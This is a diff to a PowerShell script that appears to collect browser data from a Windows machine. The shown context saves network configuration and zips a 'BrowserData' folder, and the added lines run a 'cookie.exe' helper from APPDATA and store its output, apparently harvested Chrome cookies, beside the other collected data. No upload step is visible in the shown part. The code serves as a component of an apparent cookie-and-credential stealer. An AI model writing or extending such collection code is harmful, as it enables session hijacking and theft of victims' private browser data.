@@ -269,6 +269,22 @@ $networkConfigFile = Join-Path -Path $destDir -ChildPath "NetworkConfig.txt"
 $networkConfig | Out-File -FilePath $networkConfigFile
 Write-Host "Network configuration saved."
 
+# Function to run cookie.exe and save output to cookie_output.txt
+function RunCookieExe {
+    $cookieExePath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie.exe"
+    $cookieOutputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output.txt"
+
+    if (Test-Path $cookieExePath) {
+        $cookieCommand = & $cookieExePath 2>&1
+        $cookieCommand | Out-File -FilePath $cookieOutputPath
+        Write-Host "Chrome - cookie.exe output saved to: $cookieOutputPath"
+    } else {
+        Write-Host "Chrome - cookie.exe not found."
+    }
+}
+
+# Call the function after other operations
+RunCookieExe
 
 # Zip the BrowserData folder
 $zipDir = "$env:APPDATA\ZippedBrowserData"
